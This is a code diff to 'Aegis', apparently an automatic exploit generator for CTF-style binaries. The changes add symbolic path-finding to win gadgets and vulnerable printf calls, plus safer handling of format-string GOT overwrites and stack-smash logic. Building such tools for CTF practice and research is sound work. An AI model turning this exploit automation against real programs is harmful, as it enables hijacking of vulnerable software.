@@ -49,25 +49,27 @@ class Aegis:
         self.has_format = False
         self.array_write = (None, None)
         self.got_targets = None
+        self.printf_addrs = []
 
     def static_analysis(self):
         self.machine.check_mitigations()
         self.machine.check_vulnerable_input()
         self.machine.check_leak()
         self.array_write = self.machine.check_array_write()
-        printf_addrs = self.machine.check_vulnerable_printf()
+        self.printf_addrs = self.machine.check_vulnerable_printf()
 
-        if len(printf_addrs) > 0:
+        if len(self.printf_addrs) > 0:
             self.has_format = True 
-            self.got_targets = self.machine.find_target_got_entries(printf_addrs[0])
+            self.got_targets = self.machine.find_target_got_entries(self.printf_addrs[0])
         else:
             self.got_targets = self.machine.get_got_functions("main")
 
     def symbolic_analysis(self):
         if self.array_write == (None, None) or self.array_write == None:
-            self.symbol.stack_smash()
+            self.symbol.stack_smash() 
             self.symbolic_padding = self.symbol.symbolic_padding
-        
+                
+
             if self.has_format == False:
                 self.has_format = self.symbol.has_format 
 
@@ -81,7 +83,22 @@ class Aegis:
             win_function = self.machine.bv.get_functions_containing(win_gadget)
             win_function = win_function[0] if len(win_function) >= 1 else None
             win_function = win_function.name if win_function != None else None
+
+        solution = self.symbol.find_path(win_gadget)
+        # Simple Path to Win Gadget
+        if solution != None:
+            self.against.exploit = solution
+            self.exploit()
         
+        if len(self.printf_addrs) > 0:
+            aegis_log.info(f"[{self.binary_name}] Found vulnerable printf at {hex(self.printf_addrs[0])}")
+            solution = self.symbol.find_path(self.printf_addrs[0])
+            if solution != None:
+                aegis_log.info(f"[{self.binary_name}] Found path to printf at {hex(self.printf_addrs[0])} with {solution}")
+                self.against.exploit = solution
+                self.exploit()
+        
+ 
         function = self.machine.find_functions(["win", "system", "execve", "syscall"])
         string = self.machine.find_string_address()
         writeable = self.machine.find_writeable_address()
@@ -100,14 +117,16 @@ class Aegis:
                         self.against.format_write(1337, self.elf.sym["pwnme"])
                         self.exploit()
                     else:
-                        if self.got_targets != None:
+                        got_addr = None
+                        if self.got_targets != None and len(self.got_targets) > 0:
                             got_addr = self.elf.got[self.got_targets[-1]]
                         else:
-                            got_addr = self.elf.got["fflush"]
-                        if function == "win":
+                            if "fflush" in self.elf.got.keys():
+                                got_addr = self.elf.got["fflush"]
+                        if function == "win" and got_addr != None:
                             self.against.format_write(self.elf.sym["win"], got_addr)
                             self.exploit()
-                        elif win_gadget:
+                        elif win_gadget and got_addr != None:
                             self.against.format_write(win_gadget, got_addr)
                             self.exploit()
                 else:
@@ -372,6 +391,7 @@ if __name__ == "__main__":
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
+    #logging.getLogger("angr").setLevel(logging.DEBUG)
     logging.getLogger("aegis_log").setLevel(logging.DEBUG)
 
 
